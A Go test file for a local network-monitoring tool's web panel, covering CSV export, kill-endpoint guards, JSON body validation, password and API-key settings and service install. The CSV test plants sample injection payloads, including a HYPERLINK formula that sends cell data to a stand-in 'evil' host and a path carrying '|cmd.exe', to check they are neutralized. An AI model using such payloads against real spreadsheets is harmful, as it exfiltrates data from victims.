package main

import (
	"encoding/csv"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// jsonPost drives a handler directly (no middleware) with a JSON body.
func jsonPost(h http.HandlerFunc, target, body string) *httptest.ResponseRecorder {
	r := httptest.NewRequest(http.MethodPost, target, strings.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h(w, r)
	return w
}

// A process name or a detail line is attacker-influenced text, and the CSV is a
// forensic export that will be opened in a spreadsheet. A cell starting with
// = + - @ or a tab is a formula there, so it is neutralized with a leading
// apostrophe — the classic CSV-injection defence. Ordinary cells are untouched.
func TestExportCSVNeutralizesFormulas(t *testing.T) {
	setupTestDB(t)
	logEvent(Event{Kind: "new", PID: 4242, Process: `=HYPERLINK("http://evil/"&A1,"x")`,
		Exe: `C:\Users\x\AppData\Local\Temp\-2+3|cmd.exe`, Local: "0.0.0.0:1", Remote: "@SUM(1)",
		Detail: "\tcalc"})
	logEvent(Event{Kind: "closed", PID: 7, Process: "chrome.exe", Exe: "/opt/google/chrome/chrome",
		Remote: "93.184.216.34:443", Detail: "beaconing ~60s"})

	w := httptest.NewRecorder()
	handleExportCSV(w, httptest.NewRequest(http.MethodGet, "/export.csv", nil))
	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("export is not valid CSV: %v\n%s", err, w.Body.String())
	}
	if len(rows) != 3 {
		t.Fatalf("rows = %d, want header + 2", len(rows))
	}
	var hostile, benign []string
	for _, r := range rows[1:] {
		if r[2] == "4242" {
			hostile = r
		} else {
			benign = r
		}
	}
	for i, cell := range hostile {
		if strings.ContainsAny(string([]rune(cell)[:1]), "=+-@\t\r") {
			t.Errorf("hostile row cell %d still starts a formula: %q", i, cell)
		}
	}
	// Compared on the parsed cells: the raw CSV doubles the inner quotes.
	for i, want := range map[int]string{3: `'=HYPERLINK("http://evil/"&A1,"x")`, 6: `'@SUM(1)`, 7: "'\tcalc"} {
		if hostile[i] != want {
			t.Errorf("hostile cell %d = %q, want the neutralized value %q", i, hostile[i], want)
		}
	}
	if benign[3] != "chrome.exe" || benign[7] != "beaconing ~60s" || benign[4] != "/opt/google/chrome/chrome" {
		t.Errorf("benign cells must be untouched: %v", benign)
	}
}

// The monitor must not be talked into killing itself or init, whatever the UI
// sends: both are refused before any process is touched.
func TestKillRefusesSelfAndInit(t *testing.T) {
	for _, body := range []string{
		`{"PID":` + itoa(int(ownPID)) + `}`,
		`{"PID":1}`,
	} {
		w := jsonPost(handleKill, "/api/kill", body)
		if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), `"ok":false`) {
			t.Errorf("kill %s: got %d %q, want 400 refusal", body, w.Code, w.Body.String())
		}
	}
}

// A JSON handler that ignores a decode error acts on the zero value: a bad
// body to /api/whitelist used to whitelist "" — and nothing bounded the body.
func TestJSONHandlersRejectBadBodies(t *testing.T) {
	setupTestDB(t)
	persistWhitelist.Store(false)
	for name, body := range map[string]string{
		"truncated": `{"Exe":`,
		"wrongtype": `{"Exe":123}`,
		"huge":      `{"Exe":"` + strings.Repeat("a", 2<<20) + `"}`,
	} {
		w := jsonPost(handleWhitelist, "/api/whitelist", body)
		if w.Code != http.StatusBadRequest {
			t.Errorf("%s body: got %d, want 400", name, w.Code)
		}
	}
	if n := len(whitelist()); n != 0 {
		t.Errorf("whitelist has %d entries after bad bodies, want 0", n)
	}
	for _, h := range []struct {
		name string
		fn   http.HandlerFunc
		path string
	}{
		{"ip_whitelist", handleIPWhitelist, "/api/ip_whitelist"},
		{"kill", handleKill, "/api/kill"},
		{"block_ip", handleBlockIP, "/api/block_ip"},
		{"unblock", handleUnblock, "/api/unblock"},
	} {
		if w := jsonPost(h.fn, h.path, `{"nope":`); w.Code != http.StatusBadRequest {
			t.Errorf("%s with a truncated body: got %d, want 400", h.name, w.Code)
		}
	}
}

func itoa(n int) string { return strconv.Itoa(n) }

// withTempEnv points .env at a throwaway file and clears the password after.
func withTempEnv(t *testing.T) {
	t.Helper()
	old := envPath
	envPath = filepath.Join(t.TempDir(), ".env")
	t.Cleanup(func() { setAuthPassword(""); envPath = old })
}

// Changing or removing an existing password needs the current one, so a
// hijacked session cannot quietly take the gate down; enabling it the first
// time needs nothing but the new password.
func TestSettingsPasswordFlow(t *testing.T) {
	withTempEnv(t)
	post := func(body string) map[string]any {
		w := jsonPost(handleSettings, "/api/settings", body)
		var out map[string]any
		if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
			t.Fatalf("settings response is not JSON: %v %q", err, w.Body.String())
		}
		return out
	}
	if out := post(`{"AuthEnabled":true,"AuthPassword":"short"}`); authEnabled() || out["auth_error"] == nil {
		t.Fatalf("a short password must be refused with an error, got %v", out)
	}
	if out := post(`{"AuthEnabled":true,"AuthPassword":"longenough8"}`); !authEnabled() || out["auth_error"] != nil {
		t.Fatalf("enabling with a valid password should work, got %v", out)
	}
	if out := post(`{"AuthEnabled":false}`); !authEnabled() || out["auth_error"] == nil {
		t.Fatalf("disabling without the current password must be refused, got %v", out)
	}
	if out := post(`{"AuthEnabled":true,"AuthPassword":"anothergood1","CurrentPassword":"wrong"}`); !checkPassword("longenough8") || out["auth_error"] == nil {
		t.Fatalf("replacing with a wrong current password must be refused, got %v", out)
	}
	if out := post(`{"AuthEnabled":false,"CurrentPassword":"longenough8"}`); authEnabled() || out["auth_error"] != nil {
		t.Fatalf("disabling with the current password should work, got %v", out)
	}
}

// The history exports must be well-formed documents of what is stored, and
// deleting history needs an explicit confirm — a stray call cannot wipe it.
func TestHistoryExportsAndGuardedDelete(t *testing.T) {
	setupTestDB(t)
	logEvent(Event{Kind: "remote", PID: 1, Process: "a", Exe: "/x/a", Remote: "8.8.8.8:443"})
	logEvent(Event{Kind: "closed", PID: 1, Process: "a", Exe: "/x/a", Remote: "8.8.8.8:443"})
	dbSaveScoreChange("/x/a", "8.8.8.8", 40, "path_staging/25;unsigned/15")

	w := httptest.NewRecorder()
	handleExportJSON(w, httptest.NewRequest(http.MethodGet, "/export.json", nil))
	var evs []Event
	if err := json.Unmarshal(w.Body.Bytes(), &evs); err != nil || len(evs) != 2 {
		t.Errorf("export.json: err=%v n=%d", err, len(evs))
	}
	w = httptest.NewRecorder()
	handleExportTimeline(w, httptest.NewRequest(http.MethodGet, "/export/timeline.json", nil))
	var tl []map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &tl); err != nil || len(tl) != 1 {
		t.Errorf("timeline.json: err=%v n=%d body=%s", err, len(tl), w.Body.String())
	}

	w = httptest.NewRecorder()
	handleAPIEvents(w, httptest.NewRequest(http.MethodDelete, "/api/events", nil))
	if w.Code != http.StatusBadRequest || len(queryEvents(10, "")) != 2 {
		t.Errorf("DELETE without confirm: code=%d events left=%d, want 400 and 2", w.Code, len(queryEvents(10, "")))
	}
	w = httptest.NewRecorder()
	handleAPIEvents(w, httptest.NewRequest(http.MethodDelete, "/api/events?confirm=1&kind=closed", nil))
	if w.Code != http.StatusOK || len(queryEvents(10, "")) != 1 {
		t.Errorf("DELETE with confirm and a kind filter: code=%d events left=%d, want 200 and 1", w.Code, len(queryEvents(10, "")))
	}
}

// The abuse.ch Auth-Key is a third key beside VirusTotal and AbuseIPDB: saved
// to .env, reported masked, never echoed back. (The value here is a dummy.)
func TestSettingsAbuseChKey(t *testing.T) {
	withTempEnv(t)
	keysMu.Lock()
	old := abusechKey
	abusechKey = ""
	keysMu.Unlock()
	t.Cleanup(func() { keysMu.Lock(); abusechKey = old; keysMu.Unlock() })

	const dummy = "0123456789abcdef0123456789abcdef"
	w := jsonPost(handleSettings, "/api/settings", `{"AbuseChKey":"`+dummy+`"}`)
	var out map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	if out["abusech_configured"] != true || out["abusech_hint"] != "…cdef" {
		t.Errorf("settings after saving the key: %v", out)
	}
	if getAbuseChKey() != dummy {
		t.Error("key not applied at runtime")
	}
	env, _ := os.ReadFile(envPath)
	if !strings.Contains(string(env), "ABUSECH_API_KEY="+dummy) {
		t.Errorf(".env does not hold the key: %q", env)
	}
	if strings.Contains(w.Body.String(), dummy) {
		t.Error("the full key must never be echoed back")
	}
}

// Under a service the token file is root-owned, so a user who runs efemon by
// hand lands on the gate page; it must tell them the two ways in that work.
func TestGatePageMentionsServiceHint(t *testing.T) {
	withLocalGate(t, "secrettoken")
	old := serviceMode
	t.Cleanup(func() { serviceMode = old })
	for _, svc := range []bool{true, false} {
		serviceMode = svc
		res := do(gateHandler(), "GET", "/", "127.0.0.1:5000", map[string]string{"Cookie": "lang=es"})
		if res.Code != http.StatusForbidden {
			t.Fatalf("service=%v: code %d, want 403", svc, res.Code)
		}
		body := res.Body.String()
		hint := strings_("es")["gate_body_service"]
		if svc && (hint == "" || !strings.Contains(body, hint)) {
			t.Errorf("service mode: gate page lacks the service hint %q", hint)
		}
		if !svc && (!strings.Contains(body, strings_("es")["gate_body"]) || strings.Contains(body, "sudo efemon")) {
			t.Error("manual mode: gate page must keep its usual text, without the service hint")
		}
	}
}

// /api/service: status for anyone with a session; install/uninstall only when
// elevated, and nothing but those two actions. The deferred install/uninstall
// path exits the process, so it is exercised by the manual checks, not here.
func TestServiceEndpointGuards(t *testing.T) {
	old := elevated
	elevated = false
	t.Cleanup(func() { elevated = old })
	w := httptest.NewRecorder()
	handleService(w, httptest.NewRequest(http.MethodGet, "/api/service", nil))
	var st ServiceStatus
	if err := json.Unmarshal(w.Body.Bytes(), &st); err != nil || st.Elevated {
		t.Fatalf("GET: %v %+v", err, st)
	}
	if w := jsonPost(handleService, "/api/service", `{"action":"install"}`); w.Code != http.StatusForbidden {
		t.Errorf("install without root: %d, want 403", w.Code)
	}
	elevated = true
	if w := jsonPost(handleService, "/api/service", `{"action":"explode"}`); w.Code != http.StatusBadRequest {
		t.Errorf("unknown action: %d, want 400", w.Code)
	}
	if w := jsonPost(handleService, "/api/service", `{"action":`); w.Code != http.StatusBadRequest {
		t.Errorf("bad body: %d, want 400", w.Code)
	}
}

// The service hint goes before the token path, not after it: "the URL is in:"
// must be followed by the path.
func TestGatePageServiceHintPrecedesTokenPath(t *testing.T) {
	withLocalGate(t, "secrettoken")
	old := serviceMode
	serviceMode = true
	t.Cleanup(func() { serviceMode = old })
	body := do(gateHandler(), "GET", "/", "127.0.0.1:5000", map[string]string{"Cookie": "lang=es"}).Body.String()
	hint, code := strings.Index(body, "sudo efemon"), strings.Index(body, "<code>")
	if hint < 0 || code < 0 || hint > code {
		t.Errorf("hint at %d must come before the token path at %d", hint, code)
	}
}

// Installing from an instance that already is the service would exit it for
// nothing (and leave it stopped until boot).
func TestServiceInstallRefusedInServiceMode(t *testing.T) {
	oldE, oldS := elevated, serviceMode
	elevated, serviceMode = true, true
	t.Cleanup(func() { elevated, serviceMode = oldE, oldS })
	if w := jsonPost(handleService, "/api/service", `{"action":"install"}`); w.Code != http.StatusBadRequest {
		t.Errorf("install while running as the service: %d, want 400", w.Code)
	}
}

// Ticking "require login" without typing a password used to do nothing and
// say nothing: the operator believed the panel was protected.
func TestSettingsEnableLoginNeedsPassword(t *testing.T) {
	withTempEnv(t)
	w := jsonPost(handleSettings, "/api/settings", `{"AuthEnabled":true}`)
	var out map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	if authEnabled() || out["auth_error"] == nil || out["auth_error"] == "" {
		t.Errorf("enabling login with no password must be refused with a message, got %v", out["auth_error"])
	}
	// With login already on, saving other settings with the box ticked and no
	// new password is not an error: nothing about the password changes.
	if err := setAuthPassword("longenough8"); err != nil {
		t.Fatal(err)
	}
	w = jsonPost(handleSettings, "/api/settings", `{"AuthEnabled":true}`)
	out = map[string]any{}
	json.Unmarshal(w.Body.Bytes(), &out)
	if out["auth_error"] != nil || !checkPassword("longenough8") {
		t.Errorf("keeping the login on must not error: %v", out["auth_error"])
	}
}

// The history retention was only reachable by editing .env.
func TestEventRetentionSetting(t *testing.T) {
	withTempEnv(t)
	t.Cleanup(func() { eventRetentionDays.Store(30) })
	setEventRetention(90)
	if eventRetentionDays.Load() != 90 || getSettings()["event_retention_days"] != int64(90) {
		t.Errorf("not applied: %v", getSettings()["event_retention_days"])
	}
	setEventRetention(-5)
	if eventRetentionDays.Load() != 0 {
		t.Error("negative means keep forever (0)")
	}
	setEventRetention(99999)
	if eventRetentionDays.Load() != 3650 {
		t.Error("capped at ten years")
	}
	if b, _ := os.ReadFile(envPath); !strings.Contains(string(b), "EVENT_RETENTION_DAYS=3650") {
		t.Errorf(".env: %q", b)
	}
	if w := jsonPost(handleSettings, "/api/settings", `{"EventRetentionDays":45}`); w.Code != 200 || eventRetentionDays.Load() != 45 {
		t.Errorf("via the API: code %d, value %d", w.Code, eventRetentionDays.Load())
	}
}
